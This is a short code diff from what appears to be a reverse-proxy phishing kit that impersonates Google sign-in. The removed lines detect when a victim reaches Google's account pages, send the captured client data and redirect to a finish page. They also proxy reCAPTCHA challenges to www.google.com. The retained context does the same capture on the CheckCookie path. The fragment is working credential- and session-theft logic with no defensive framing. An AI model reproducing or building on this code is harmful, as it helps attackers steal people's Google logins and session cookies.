@@ -205,29 +205,6 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             super.captureBody(clientContext.currentDomain, clientContext)
         }
         
-
-        const redirectToken = this.checkForRedirect()
-        if (redirectToken !== null) {
-            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)
-
-            if (redirectToken.url.startsWith('https://myaccount.google.com/') || 
-            redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
-                super.sendClientData(clientContext, {})
-                this.res.writeHead(302, { location: '/auth/login/finish' })
-                return super.cleanEnd('PHP-EXEC', clientContext)
-            }
-
-            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
-            if (redirectToken.obj.pathname.startsWith('/account/challenge/recaptcha')) {
-                this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')
-
-            } else {
-                this.req.url = reqCheck 
-            }
-
-        }
-       
-
         if (this.req.url.startsWith('/CheckCookie?continue=http')) {
             super.sendClientData(clientContext, {})
             this.res.writeHead(302, { location: '/auth/login/finish' })
